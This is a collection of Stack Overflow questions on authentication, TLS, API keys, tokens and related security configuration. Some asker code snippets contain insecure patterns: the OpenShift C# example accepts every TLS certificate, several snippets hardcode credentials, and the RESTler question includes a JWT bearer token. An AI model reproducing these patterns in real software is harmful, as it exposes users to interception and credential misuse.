<a href=""https://i.stack.imgur.com/q9DU0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/q9DU0.png"" alt=""picture of auth checkbox"" /></a></p>
<p>does not work, like it should:
<a href=""https://i.stack.imgur.com/pd3Yw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pd3Yw.png"" alt=""auth checkbox with basic setting"" /></a></p>
<p>This is my auth class:</p>
<pre class=""lang-cs prettyprint-override""><code>public class HttpBasicAuthorizeAttribute:AuthorizeAttribute {

    public override void OnAuthorization(System.Web.Http.Controllers.HttpActionContext actionContext) {
        Debug.WriteLine(actionContext.Request.Headers);
        if (actionContext.Request.Headers.Authorization != null) {
            // get the Authorization header value from the request and base64 decode it
                            
            string userInfo = Encoding.Default.GetString(Convert.FromBase64String(actionContext.Request.Headers.Authorization.ToString()));
            // custom authentication logic
            if (string.Equals(userInfo,string.Format(&quot;{0}:{1}&quot;,&quot;name&quot;,&quot;=password&quot;))) {
                IsAuthorized(actionContext);
            }
            else {
                HandleUnauthorizedRequest(actionContext);
            }
        }
        else {
            HandleUnauthorizedRequest(actionContext);
        }
    }

    protected override void HandleUnauthorizedRequest(System.Web.Http.Controllers.HttpActionContext actionContext) {
        actionContext.Response = new HttpResponseMessage(System.Net.HttpStatusCode.Unauthorized) {
            ReasonPhrase = &quot;Unauthorized&quot;
        };
    }
}
</code></pre>
"
"<p>My goal is to create a WPF application to perform a &quot;bitbucket project manager&quot;.</p>
<p>I discover <a href=""https://github.com/MitjaBezensek/SharpBucket"" rel=""nofollow noreferrer"">SharpBucket</a> but I'm not quite sure how to use it. I'm already able to create a commit on a new branch and push it on remote with <a href=""https://github.com/libgit2/libgit2sharp"" rel=""nofollow noreferrer"">LibGit2Sharp</a>, but now I need the last step of the process: create a Pull Request on Bitbucket for the created branch. Could you please provide me an example?</p>
<p>Last note: I don't have the OAuth/2 bitbucket credentials, so I can access only by basic authentication (bitbucket HTTP access token).</p>
<p>Thanks in advance.</p>
"
"<p>I am trying to get Openshift API token  from (oauth/token/request) using C# with basic auth but able to see only Openshift Log in screen.But same URL working fine with PostMan.
I tried getting token with all ways like using HttpClient/RestClient/HttpWebRequest but getting some garbage response only.
Below is C# code sample</p>
<pre><code> public async Task OpenShiftLogin(OpenShiftinfo server)
 {
     // API URL and credentials
     string apiUrl = &quot;https://oauth-openshift.apps.&quot; + server.Host + &quot;/oauth/token/request&quot;;
     string clientId = server.User;
     string clientSecret = server.Password;
     string credentials = String.Format(&quot;{0}:{1}&quot;, clientId, clientSecret);

     try
     {
         // Create HttpClient instance
         using (HttpClientHandler handler = new HttpClientHandler())
         {
             // Set SSL/TLS certificate validation callback to always return true (trust all certificates)
             handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) =&gt; true;
             handler.AllowAutoRedirect = true;
             handler.CookieContainer = new CookieContainer();
             handler.Proxy = null;

             // Create HttpClient with custom handler
             using (HttpClient client = new HttpClient(handler))
             {
                 // Add Basic Authentication header
                 client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(&quot;Basic&quot;, Convert.ToBase64String(Encoding.UTF8.GetBytes(credentials)));

                 // Add User-Agent header
                 client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(&quot;POpenShiftTool&quot;, &quot;1.0&quot;));

                 // Additional configurations for HttpClient
                 client.Timeout = TimeSpan.FromSeconds(30); // Request timeout
                 client.DefaultRequestHeaders.Accept.Clear();
                 client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(&quot;application/json&quot;));

                 List&lt;KeyValuePair&lt;string, string&gt;&gt; requestData = new List&lt;KeyValuePair&lt;string, string&gt;&gt;();
                 requestData.Add(new KeyValuePair&lt;string, string&gt;(&quot;grant_type&quot;, &quot;client_credentials&quot;));

                 FormUrlEncodedContent requestBody = new FormUrlEncodedContent(requestData);

                 HttpResponseMessage response = await client.PostAsync(apiUrl, requestBody);

                 // Handle response
                 if (response.IsSuccessStatusCode)
                 {
                     // Check for cookies in the response headers
                     IEnumerable&lt;string&gt;? cookieValues;
                     if (response.Headers.TryGetValues(&quot;Set-Cookie&quot;, out cookieValues))
                     {
                         // Process each cookie and add it to the CookieContainer
                         foreach (string cookieValue in cookieValues)
                         {
                             handler.CookieContainer.SetCookies(new Uri(apiUrl), cookieValue);
                         }
                     }

                     string responseBody = await response.Content.ReadAsStringAsync();
                     _logger.Info(responseBody);
                     Console.WriteLine(responseBody);

                 }
             }
         }
     }
     catch (Exception ex)
     {
         // Handle exceptions
         Console.WriteLine($&quot;Error: {ex.Message}&quot;);
     }
 }
</code></pre>
<p>actual Openshift request token API output</p>
<p><a href=""https://i.stack.imgur.com/4oQgG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4oQgG.png"" alt=""enter image description here"" /></a></p>
<p>application output</p>
<p><a href=""https://i.stack.imgur.com/dr1gD.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dr1gD.png"" alt=""enter image description here"" /></a></p>
"
"<p>I am trying to protect my swagger UI URL with express-basic-auth and it worked pretty fine locally in the nestjs server but when I uploaded it to my ubuntu vps it made accessing the swagger UI page not possible and chrome is showing this error</p>
<pre><code>This site can’t be reachedThe web page at http://mydomain/docs might be temporarily down or it may have moved permanently to a new web address.
ERR_TOO_MANY_RETRIES
</code></pre>
<p>Here is how I implemented it</p>
<pre><code>  app.use(
    '/docs*',
    expressBasicAuth({
      challenge: true,
      users: {
        user: 'password',
      },
    }),
  );
</code></pre>
"
"<p>how can I combine ApiKey with Basic Authentication?
The API requires to pass ApiKeyby extending the Basic Auth Headers.
Actualy pass 2 more headers in basic auth (apiVersion &amp; apiKey)</p>
<p>The manual has the following example (cURL command line)</p>
<pre><code>curl --basic \
    -u &quot;apiVersion=1;apiKey=myapikey;usename:password&quot; \
    -H 'Content-Type: application/json' \
    -i http://someapi.com/rest/getdata?id=123
</code></pre>
<p>How can I do that with PHP cURL?</p>
<p>Thanks</p>
"
"<p>I've searched and have not found any answer that doesn't involved handling the credentials in <code>webView(_:didReceive:completionHandler:)</code></p>
<p>My goal is to render the same auth challenge that occurs in Safari or any other browser so that my code doesn't have to touch the user's credentials.</p>
<p>You can see a sample challenge by visiting <a href=""https://httpbin.org/basic-auth/username/password"" rel=""nofollow noreferrer"">https://httpbin.org/basic-auth/username/password</a> in any browser</p>
<p>Is this even possible?</p>
<p>For clarity:
If you visit the link above in a normal browser, an auth challenge is displayed/rendered. If you do so in a <code>WKWebView</code>, nothing is displayed. You sit at a white screen.</p>
<p>I'm trying to determine the difference in those behaviors, such as why is it rendered in a normal browser but not web view? Is it the browser that renders the challenge, or is it part of the web content of the URL being visited?</p>
<p>Finally, can Basic Auth be done in <code>WKWebView</code> (or <code>WebView</code>) in such a way as my code doesn't touch the user credentials, because it's the web server handling it via the content displayed in those views?</p>
"
"<p><a href=""https://en.wikipedia.org/wiki/Address_space_layout_randomization"" rel=""nofollow noreferrer"">Address space layout randomization</a> is a decently effective method for defeating exploits against a binary, in that the exploit has to successfully locate the memory addresses it wishes to attack first and can't rely on them being constant. I'm interested in the possibility of taking this further and introducing randomness into the compilation process to change compile-level implementation details, such as putting variables in different registers or in a different order in the stack frame, or doing LLVM passes in a different order to cause functions and constexprs to inline differently, or perhaps even introduce a 1-in-1000 bounds or null check that would otherwise be excluded from a fully optimized build. A different build could be created per user, such that all of my users get their own binary that adheres to the source code but has different side channels and UB, thus highly limiting the effectiveness of any attacks that rely on those things.</p>
<p>Is there any major build toolchain/language that can be configured to do this? If not, is there a way I could simulate something like this in my source code?</p>
<p>(I would also welcome a frame challenge to this idea. For instance, I acknowledge that having a <a href=""https://en.wikipedia.org/wiki/Reproducible_builds"" rel=""nofollow noreferrer"">fully reproducible build</a> might be more valuable than anything I might get from giving every user a personalized build. However, I also feel that this idea could be useful in testing, such that devs can be confident that it's their source code, and not the specific version of the compuler they're using, that determines the software's correctness.)</p>
"
"<p>When I started my C# API project in VS2022, I got an error 'Unable to configure HTTPS endpoint. No server certificate was specified, and the default developer certificate could not be found or is out of date.' After running Certmgr.mgc I saw that my Personal&gt;Certificates were out of date so I deleted them and ran <code>dotnet dev-certs https -t</code> followed by <code>dotnet dev-certs https --clean</code>.</p>
<p>Then my Chrome browser ran but with this error:</p>
<blockquote>
<p>'Your connection is not private
Attackers might be trying to steal your information from localhost (for example, passwords, messages or credit cards).'</p>
</blockquote>
<p><a href=""https://i.stack.imgur.com/ks3tT.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ks3tT.png"" alt=""enter image description here"" /></a></p>
<p>I've tried running the dotnet commands again in reverse order, I've also tried toggling the 'Always use secure connections' in my browser settings but I can't get rid of this error. I'm sure others will have had this error so can someone please help as I can't get any work done until my browser is working properly.</p>
"
"<p>I've been trying to run the hashicorp/vault docker image in a production environment with https using docker.</p>
<p>I'm running a node server and using the <a href=""https://www.npmjs.com/package/hashi-vault-js"" rel=""nofollow noreferrer"">hashi-vault-js</a> npm package to connect to my vault</p>
<p>I did this in Dev mode and it was pretty easy but not so much in production.</p>
<p>In dev mode, I run:</p>
<p><code>sudo docker run --name=dev-vault --cap-add=IPC_LOCK -p 8200:8200 hashicorp/vault:latest server -dev</code></p>
<p>Then I export the VAULT_ADDR and VAULT_TOKEN by executing commands in the container's isolation mode.</p>
<p>But this will run it in Dev mode and without a secure SSL/TLS.</p>
<p>From the official docs, I created a vault.hcl and configured everything but it just always seems to want to find a local.json file ....really confused...(I'm new to Hashicorp vault).</p>
<p>So please how do I do this in production but with a secure SSL/TLS and without mlock 😞🥺🥺.</p>
"
"<p>i have a properly sandboxed and codesigned app for macOS in objective-c. On Sonoma (macOS 14) i keep getting the dialog &quot; would like to access data from other apps&quot;. According to Apple Developer this is a new security related message on macOS 14.2.</p>
<p>See here: <a href=""https://developer.apple.com/forums/thread/742147"" rel=""nofollow noreferrer"">https://developer.apple.com/forums/thread/742147</a></p>
<p>My App is developed according to Apples guidelines. E.g. using Open or SavePanels, Security scoped Bookmarks and so on. It does NOT try to access anothers app AppContainer (so this is whats confusing me).</p>
<p>My app controls another one by the usage of Apple Events but i do not try to access the apps AppContainer to read/write data.</p>
<p>CodeSigning uses a valid DeveloperIDApplication signature, Notarization also succeeds every time.</p>
<p>I searched through Developer Docs, Forums and so on and I am quite lost, just seeing that others got this issue too.</p>
<p>Any hint towards the right direction is very much appreciated.</p>
"
"<p>I want to run a SLURM job on a remote cluster to analyze sensitive data stored locally (<code>/data/mydata.csv</code>). The job is defined in <code>job.sh</code>, which executes an analysis script (<code>r_script.R</code>) for data analysis. To avoid uploading sensitive data to the remote server, I attempted to directly load it from the local system pasting an SSH command together within <code>r_script.R</code>,</p>
<pre><code>ssh user@local.ip 'cat /data/mydata.csv'
</code></pre>
<p>which essentially opens a connection to load the data into memory.</p>
<p>I set up SSH key pairs for passwordless access and wrote a Bash script (<code>job.sh</code>) with a <code>-d</code> flag for specifying the data file location.</p>
<p>This setup <strong>works fine when running the script directly</strong>,</p>
<pre><code>$ ./job.sh -d user@local.ip:/data/mydata.csv
</code></pre>
<p>but <strong>fails under SLURM</strong>,</p>
<pre><code>$ sbatch ./job.sh -d user@local.ip:/data/mydata.csv
</code></pre>
<p>due to unavailable SSH or SSH keys in SLURM, resulting in a <code>status 255</code> error. Tried <code>ssh-add -L</code> which indeed fails.</p>
<p>Considering an alternative to <code>wget</code> a password-protected <code>.zip</code> and pass the password with a <code>-p</code> flag for interactive input, I realized this exposes the password in plain text, which is not secure.</p>
<p>I am looking for a method, such as an <code>sbatch</code> flag or a secure file transfer protocol available in SLURM, to securely transfer my sensitive local data to a SLURM job while avoiding direct uploads. How can this be achieved?</p>
<p>I can share scripts for more context if needed. Any insights or suggestions are welcome.</p>
"
"<p>The scenario is this:</p>
<p>Open two instances of Windows explorer on a computer with a locked drive.</p>
<p>Click on the drive in one of the windows and enter its BitLocker password.</p>
<p>The drive unlocks, and the icon on the second window changes to unlocked as well.</p>
<p>Obviously, Windows has some event it's listening to, to receive this information. What is it?</p>
"
"<p>I don't see why the access token-refresh token system is more secure. Can't I just stick to using an access token for like 5 days? It feels like there's not much of an advantage. If someone steals my access token in a system with access token-refresh token, I might end up in an equally or even worse situation, as the refresh token can stay active for a whole year. Hackers could just keep asking for new access tokens.</p>
<p>and other stuff like token-binding can be just done with the long lived access token...</p>
<p>I've been looking for answers, but no luck so far.
I hope to get a good answer here.</p>
<p>Thank you.</p>
"
"<p>I would like to fuzz my API with a Bearer token (JWT).
I have many routes on my NodeJS API with a special route /login which return a token if your username and password sent in the request body are correct. Then I can use this token for access to all my API, for example a curl request which work fine:
<code>curl -X GET -H &quot;Accept: application/json&quot; -H &quot;Host: localhost:8080&quot; -H &quot;Authorization: Bearer &lt;MY_JWT_TOKEN&gt;&quot; http://localhost:8080/</code></p>
<p>So I've tried two methods seen in the Authentication.md and SettingsFile.md, the Module and the Location but neither of them worked.
Firtsly, a trailer of my swagger.json file :</p>
<pre class=""lang-json prettyprint-override""><code>{
  &quot;openapi&quot;: &quot;3.0.0&quot;,
  [...]
  &quot;paths&quot;: {
    &quot;/&quot;: {
      &quot;get&quot;: {
        &quot;summary&quot;: &quot;Racine de l'API.&quot;,
        &quot;responses&quot;: {
          &quot;200&quot;: {
            &quot;description&quot;: &quot;Succès, l'API fonctionne correctement.&quot;
          },
          &quot;401&quot;: {
            &quot;$ref&quot;: &quot;#/components/responses/UnauthorizedError&quot;
          }
        },
        &quot;security&quot;: [
          {
            &quot;bearerAuth&quot;: []
          }
        ]
      }
    },
  &quot;components&quot;: {
    &quot;securitySchemes&quot;: {
      &quot;bearerAuth&quot;: {
        &quot;type&quot;: &quot;http&quot;,
        &quot;scheme&quot;: &quot;bearer&quot;,
        &quot;bearerFormat&quot;: &quot;JWT&quot;
      }
    },
    &quot;responses&quot;: {
      &quot;UnauthorizedError&quot;: {
        &quot;description&quot;: &quot;Authentication token is missing or invalid&quot;
      }
    }
  },
  &quot;tags&quot;: []
}
</code></pre>
<p>I've only put the interesting parts of this swagger.json and I've tested it on swagger editor and it's fine. After compiling the file, I try the Test and that's when the problems start.</p>
<p>For the Location method :</p>
<p>My engine_settings.json :</p>
<pre class=""lang-json prettyprint-override""><code>{
  &quot;authentication&quot;: {
    &quot;token&quot;: {
      &quot;location&quot;: &quot;/home/guillaume/fuzzing-tools/restler/restler_bin/test-auth1/authentication_token.txt&quot;,
      &quot;token_refresh_interval&quot;:  300
    }
  },
  &quot;exclude_requests&quot;: [
    {
      &quot;endpoint&quot;: &quot;/login&quot;,
      &quot;methods&quot;: [&quot;POST&quot;]
    }
  ]
}
</code></pre>
<p>I'm excluding the /login route at first because I don't need to test it and I already have a valid token in my authentication_token.txt file which just contains a line with my token, like :
<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1aWxsYXVtZSIsImlhdCI6MTcwNzQ4NTQ3MSwiZXhwIjoxNzA3NTA3MDcxfQ.n1rP__tMb1qIquDjrh057jGLUSBgfeX9XUwfbD9L8gE</code></p>
<p>Except the engine_settings.json file, I didn't change anything else. I don't know if I needed to change anything according to the documentation, if I've understood correctly.</p>
<p>Then i make my Test command : <code>../restler/Restler test --grammar_file Compile/grammar.py --dictionary_file Compile/dict.json --settings Compile/engine_settings.json --no_ssl</code></p>
<p>The result :</p>
<pre><code>Starting task Test...
Using python: 'python3' (Python 3.11.7)
Request coverage (successful / total): 0 / 6
Attempted requests: 5 / 6
No bugs were found.
See 'coverage_failures_to_investigate.txt' to investigate API coverage.
Task Test succeeded.
Collecting logs...
</code></pre>
<p>A trailer of my coverage_failures_to_investigate.txt for the root route :</p>
<pre><code>Request: Get 
Number of blocked dependent requests: 0

        +++ Combination 1 +++:
        Request sequence: 
        &gt; GET / HTTP/1.1\r\nAccept: application/json\r\nHost: localhost:8080\r\nAUTHORIZATION TOKEN\r\n\r\n
        &lt; HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n


        +++ Combination 2 +++:
        Request sequence: 
        &gt; GET / HTTP/1.1\r\nAccept: application/json\r\nHost: localhost:8080\r\nAUTHORIZATION TOKEN\r\n\r\n
        &lt; HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n
</code></pre>
<p>It's sending me back a 400 Bad request error, so I don't know what the problem is. I think it's not managing to format the request header properly with a Bearer token, so if anyone can help me, I'd love to! Basically, I wanted to show both methods, but I thought it was a bit much.</p>
"
"<blockquote>
<p>Can someone help me understand how EMV Issuer Master Key rotation
should be handled?</p>
</blockquote>
<p>A first step would be to figure out if i have to talk about rotation or replacement.
I mean, as a best practice for key management i think that even these keys should be rotated periodically.
Obviously i would like to understand how to minimize the impact on the cards circulating knowing that the process would involve more parties (Issuer, card producer, scheme(?)).</p>
<blockquote>
<p>Is it possible in this process rotate keys? (generates a new version
of a key with same key)</p>
</blockquote>
"
"<p>For a signed .app/binary we can get &quot;signing-timestamp&quot; (kSecCodeInfoTimestamp) using SecCodeCopySigningInformation method using SecStaticCodeRef in security framework.</p>
<p>But for pkg SecCode apis don't work &amp; we need to fetch information using xar apis. Using <code>xar_signature_get_x509certificate_data</code> other information like issuer, serial no, validity time,etc is available but the signing time stamp, the time at which the pkg was signed is not available in the dictionary created by using <code>xar_signature_get_x509certificate_data</code> &amp; <code>x509_st</code>. There is no api to get the trusted timestamp.</p>
<p>I tried running <code>pkgutil --check-signature</code> via code &amp; parse it's output. For pkg with small size there is no issue. But if we have a huge file in GBs like the os upgrade InstallAssistant.pkg which is 12.2 GB, on terminal <code>pkgutil --check-signature</code> itself takes around 22sec to post the output.</p>
<p>How to get the timestamp, the value after <code>&quot;Signed with a trusted timestamp on:&quot;</code> for pkg programmatically?</p>
<p>e.x. pkgutil --check-signature zoomusInstallerFull.pkg</p>
<pre><code>Status: signed by a developer certificate issued by Apple for distribution

Notarization: trusted by the Apple notary service

Signed with a trusted timestamp on: 2022-06-27 01:26:22 +0000

Certificate Chain:

    Developer ID Installer: Zoom Video Communications, Inc. (BJ4HAAB9B3) Expires: 2027-02-01 22:12:15 +0000 SHA256 Fingerprint: 6D 70 1A 84 F0 5A D4 C1 C1 B3 AE 01 C2 EF 1F 2E AE FB 9F 5C A6 80 48 A4 76 60 FF B5 F0 57 BB 8C ------------------------------------------------------------------------

    Developer ID Certification Authority Expires: 2027-02-01 22:12:15 +0000 SHA256 Fingerprint: 7A FC 9D 01 A6 2F 03 A2 DE 96 37 93 6D 4A FE 68 09 0D 2D E1 8D 03 F2 9C 88 CF B0 B1 BA 63 58 7F ------------------------------------------------------------------------

    Apple Root CA Expires: 2035-02-09 21:40:36 +0000 SHA256 Fingerprint: B0 B1 73 0E CB C7 FF 45 05 14 2C 49 F1 29 5E 6E DA 6B CA ED 7E 2C 68 C5 BE 91 B5 A1 10 01 F0 24
</code></pre>
"
"<p>composer update error :</p>
<p>In CurlDownloader.php line 372:</p>
<p>curl error 60 while downloading <a href=""https://repo.packagist.org/p2/laravel/sanctum.json"" rel=""nofollow noreferrer"">https://repo.packagist.org/p2/laravel/sanctum.json</a>: SSL certificate problem: unable
to get local issuer certificate</p>
<p>composer update
and i was expectint it to update all my dependencies</p>
"
"<p>I am at a point again where I need to reconsider my approach for authenticating users to my iFrame.</p>
<p>So let me give some context. I have a chatbot service, this service is meant to be embedded into my user's website. Therefore I need an identifier for that user, so that I can load the chatbot's iFrame with the necessary data for my user, creating a session under the name of my user for the enduser using the chatbot.</p>
<p>And so I wend on to build a server to server authentication method, in which The user's backend would communicate with mine using an API-Key with https to securely issue these sessions to the enduser to start talking with the chatbot. The server to server method is awesome for security, as this means as long as my user is the only one in possession of his api key, then only that user is able to initiate a chatbot session using his data, as well as incrementing his usage meters.</p>
<p>But this resulted in increased complexity and also came at the expense of user experience. The Server to Server approach requires the iFrame to support a multitude of backend infrastructure. So for example wix requires using http functions. There are backends that work with python on flask, others with nodejs. This Server to Server method requires the user to also make an endpoint on his server, which is something I would rather avoid, but I am not sure if requiring new endpoints from your user is normal or standard or not.</p>
<p>And then I had to go reevaluating to the frontend approach. So I use Firebase, a google service for managing login and authentication of users. Firebase also uses frontend authentication, where my credentials are stored on the frontend. This should work because google uses domain whitelisting and other various security measures. (Am I stupid for leaving my firebase credentials on frontend???? or does this make sense xD)</p>
<p>And so I thought I could also use a similar identifier for my user. He would then whitelist his website's domain allowing that identifier to only be accessed from that whitelisted website. The question now, is this a secure approach??? what can I also use as security measures? Can't someone impersonate the user's domain let's say myuserA.com and call the chatbot's IFrame from his fake website? Due to the identifier now being in the frontend. If someone were able to impersonate my user's domain, what use would that bring him? Let's say the impersonator works on music, whereas myuserA works on sport. The IFrame would still always answer with the data for sports from myuserA. It would act like free marketing to myuserA, still would cost more money tho, but still it effectively advertises myuserA's products and services. How realistic are these risks? Is the extra work for making the IFrame able to support multiple backend infrastructures a better approach? What else can I do to make the frontend approach more secure? As that approach seems quite simpler and user-friendly.</p>
<p>Notes:</p>
<p>The Chatbot's IFrame only has access to PUBLIC data already available online.
The session is going to be issued in form of a jwt, which are short lived and regulated by the server.
Thank you for reading this :D. I am still inexperienced in these aspects but I am willing to learn more about it.</p>
"
"<p>I've been playing with spring-boot-starter-security and i've managed to get my Rest Controller to work with 1 IP whitelist, but unable to make it with many, since i need to adjust input to list from where I am only seeing red in terminal. I am even on the right path?</p>
<pre class=""lang-java prettyprint-override""><code>public class SecurityConfig {

    // GET THE Whitelisted IP value from the application.properties:
    @Value(&quot;${allowed.ip.address}&quot;)
    private String allowedIpAddress;


    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests((requests) -&gt; requests
            .anyRequest().access(hasIpAddress(allowedIpAddress))
            )
            .formLogin((form) -&gt; form
                .loginPage(&quot;/login&quot;)
                .permitAll()
            )
            .logout((logout) -&gt; logout.permitAll());

        return http.build();
    }

     private static AuthorizationManager&lt;RequestAuthorizationContext&gt; hasIpAddress(String ipAddress) {
        IpAddressMatcher ipAddressMatcher = new IpAddressMatcher(ipAddress);
        return (authentication, context) -&gt; {
            HttpServletRequest request = context.getRequest();
            return new AuthorizationDecision(ipAddressMatcher.matches(request));
        };
    }


}
</code></pre>
<p>I've tried configurations which i found on the official spring boot site, but were all returning to errors.</p>
"
"<p>In order that no harmful scripts are executed by a large amount of users, we would like to prevent them to execute python scripts that are not issued by some specific internal teams.  We are thinking to sign scripts and allow only the execution of signed scripts by users. How could this be achieved practically ? we don't find any relevant doc on Miniconda (any version) nor on Anaconda ? Does this feature exist ?</p>
"
"<p>The developer of my web site asked me for the Client ID and Secret Key to integrate the PayPal Payment.
My Question is: If I provide these credentials can they withdraw funds from my account?</p>
"
"<p>I need to install a self-signed SSL certificate to trusted root on the windows device from my uwp app code how can I achieve this?</p>
"
"<p>I have created an simple web application firewall that can detect multiple types of attack using ml and I want to test it . FOR that I I have  set up this firewall at front of website such that it will intercept request going for website and allow only legiment traffic .</p>
<p>I set-up the revsered proxy server for this using appache (on windows) but didn't work
Any solution
Note :the firewall was made as and web application too ,I can't provide detail code here</p>
"
"<p>From what I have learned, you should never pass any critical information in the URL while making an HTTPS request, because it is not as strongly encoded as the body is. But after some research it seems like this idea is not true anymore (or never was) ?</p>
<p>There are multiple reason why you would want to use a BODY and not the URL, would it be size, the risk of saving the password in local history etc., but it seems like my knowledge on the matter is a bit outdated.</p>
<p>What are the current differences, on a modern browser, between the information in the URL and the BODY of an HTTPS request? Is it any different than what was the case with HTTP, back in the old days ?</p>
<p>I have ask multiple AI, that seem to give me differents anwsers.
I have checked google with &quot;Difference between the BODY and url in HTTPS&quot; but the answers where disappointing.</p>
"
"<p>I want to store my refresh token in react, but I'm not sure where to store it. I've heard that it's best to store it in &quot;HttpOnly&quot; cookies. But I know it's not possible.</p>
<p>I saw online to store it in the local storage, but I know it's a bad idea. I also saw that I should store in context, then other opinions sparked saying that it's wrong to do so, I really don't know what to do.</p>
<p>So many opinions.
Thank you for your time.</p>
"
"<p>Beginner here, don't get offended. Imagine you are writing a web site for some organization. There will be Frontend #1 for public web site, and there will be Frontend #2 for admin panel (through which they will update contents of that web site).</p>
<p><strong>CASE 1</strong></p>
<p>Have 2 separate backends in one solution:</p>
<ol>
<li>PublicApi (API)</li>
<li>AdminApi (API)</li>
<li>PublicServices</li>
<li>AdminServices</li>
<li>Data (this one is shared among both APIs, to make sure both have updates on entity structure)</li>
</ol>
<p>Then you would deploy apps separately, restricting requests to AdminApi only from certain network or static IP.</p>
<p><strong>CASE 2</strong></p>
<p>Have just one API, just put [Authorize] to certain routes and get over it. The question is is this secure enough? Because theoretically you would have the admin panel's routes exposed globally (with just some jwt auth on them). How can I make those endpoints not visible globally in one API? And more importantly should I bother?</p>
<p>How would you do? And why? The goal is to make the app safe.</p>
<p><em>P.S.</em></p>
<p>My setup is: .Net 8, Nginx</p>
"
"<p>I have a simple WinForms .Net 4.8.1 launcher application that works perfectly if everything is local, but fails with invalid directory if the files are stored on a share.  The MainForm has two text boxes for inputting credentials and 2 buttons as well as some images and labels...  The issue is in the following code:</p>
<pre><code>    private void Ok_Click(object sender, EventArgs e)
    {
        ProcessStartInfo psi = new ProcessStartInfo(&quot;AdminApp.exe&quot;)
        {
            Verb=&quot;runas&quot;,
            UserName=userName.Text.Trim(),
            PasswordInClearText=password.Text.Trim(),
            LoadUserProfile=true,
            Domain=&quot;DOMAIN&quot;,
            ErrorDialog=true,
            UseShellExecute=false
        };
        Process.Start(psi);
        Application.Exit();
    }
</code></pre>
<p>The app needs to run with Admin Credentials.  We use Avecto and when using that to specify admin credentials it just adds an admin token to the current user no matter what valid credentials are supplied (if logged on user is PlainUser, and we supply credentials for AdminUser, the app gets executed as PlainUser with an admin token instead of AdminUser and we need to execute it as AdminUser).  The above code launches in the correct user context with Admin token when run from the local drive but fails if run from a share with invalid directory.  I have tried supplying the absolute path to the executable, setting the WorkingDirectory, setting both, and setting a relative path as well...</p>
<p>The application needs Admin rights to backup and restore files from multiple profiles as well as settings in HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER (this is for a specific application, not a backup/restore for the machine/profile).</p>
<p>We are trying to eliminate Guest access to SMB shares on NAS devices and we are trying to avoid using a single account embedded in the application so that an Admin from Office X does not have access to files in Office Y by using security groups.</p>
<p>Any ideas?</p>
"
"<p>When I try to install react-native-config in my react native project on ios I always get the same output:</p>
<pre><code>
141 packages are looking for funding
  run `npm fund` for details

5 high severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
</code></pre>
<p>No matter how I do it</p>
<p><code>npm install react-native-config</code>
<code>npm i react-native-config</code>
<code>npm install github:lugg/react-native-config</code></p>
<p>I've tried to reinstall my project from scratch several times.
I've installed react-native-config from both npm and github repositories.
I've executed <code>npm audit</code>:</p>
<pre><code># npm audit report

ip  *
Severity: high
NPM IP package vulnerable to Server-Side Request Forgery (SSRF) attacks - https://github.com/advisories/GHSA-78xj-cgh5-2h22
fix available via `npm audit fix --force`
Will install react-native@0.68.7, which is a breaking change
node_modules/ip
  @react-native-community/cli-doctor  *
  Depends on vulnerable versions of ip
  node_modules/@react-native-community/cli-doctor
    @react-native-community/cli  &gt;=4.13.0
    Depends on vulnerable versions of @react-native-community/cli-doctor
    Depends on vulnerable versions of @react-native-community/cli-hermes
    node_modules/@react-native-community/cli
      react-native  &lt;=0.0.0-ffdfbbec0 || &gt;=0.69.0-rc.0
      Depends on vulnerable versions of @react-native-community/cli
      node_modules/react-native
  @react-native-community/cli-hermes  *
  Depends on vulnerable versions of ip
  node_modules/@react-native-community/cli-hermes

5 high severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force
</code></pre>
<p>I've executed several times <code>npm audit fix --force</code> , which takes me on a loop reinstalling different versions of react-native. In the end, it takes me back to the same output.</p>
"
"<p>im trying to implement the &quot;Sign in with X&quot;-Login for my Webapi. My Client is a native app. Can/Should i exchange the authorization code for an access token client-side? Can i use given access token as an access-token for my backend?</p>
<p>Or should i send the Authorization Code to my backend where it is exchanged for an access token with the identity provider? Could i use this token as an Auth-Token for my backend or should i generate a new token just for my backend?</p>
<p>I am not sure, what the implications of each of these approaches would be. The first approach would lead to the deployment of my client secret. My identity provider does not allow the creation of public clients.</p>
<p>Thanks!</p>
"
"<p>With my symfony project, i log my user trough ldap.
When i change LDAP (Active Directory) password (on the server, i cant with a form at this time), I can log in for a while with my most recent password and my old one (I don't know how long exactly).</p>
<pre><code>security:
    # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    # https://symfony.com/doc/current/security.html#loading-the-user-the-user-provider
    #providers: responsable de charger les utilisateurs à partir d'une source de données : ex : MySQL, LDAP...
    providers:
        ldap:
            ldap:
                service: Symfony\Component\Ldap\Ldap
                base_dn: 'DC=domain,DC=com'
                search_dn: '%env(LDAP_ADMIN_ACCOUNT)%'            
                search_password: '%env(LDAP_PASSWORD)%'
                default_roles: ROLE_USER         
                uid_key: sAMAccountName
        users_in_memory: { memory: null }
        # used to reload user from session &amp; other features (e.g. switch_user)
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            provider: ldap
            form_login_ldap:
                service: Symfony\Component\Ldap\Ldap
                login_path: app_login
                check_path : app_login
                dn_string: 'domain\{user_identifier}'
                enable_csrf: false
                username_parameter: login[username]
                password_parameter: login[password]
            logout:
                path: &quot;logout&quot;
                target: /login

            # activate different ways to authenticate
            # https://symfony.com/doc/current/security.html#the-firewall

            # https://symfony.com/doc/current/security/impersonating_user.html
            # switch_user: true

